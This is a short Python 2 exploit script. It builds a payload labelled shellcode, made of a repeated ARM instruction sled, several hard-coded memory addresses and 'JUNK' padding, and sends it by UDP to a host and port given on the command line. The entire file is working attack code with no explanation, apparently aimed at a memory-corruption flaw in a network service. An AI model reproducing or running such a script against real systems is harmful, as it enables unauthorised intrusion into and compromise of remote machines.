#!/usr/bin/python

import sys, socket

shellcode = ("\x01\x10\xa0\xe1"*26
+"\x3c\x15\xee\x76"
+"\x44\x79\xf8\x76"+"JUNK"+"\x54\x11\xea\x76")

sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_addr = (sys.argv[1], int(sys.argv[2]))
sock.sendto(shellcode, server_addr)
sock.close()

print "Shellcode Length: %d" %len(shellcode)

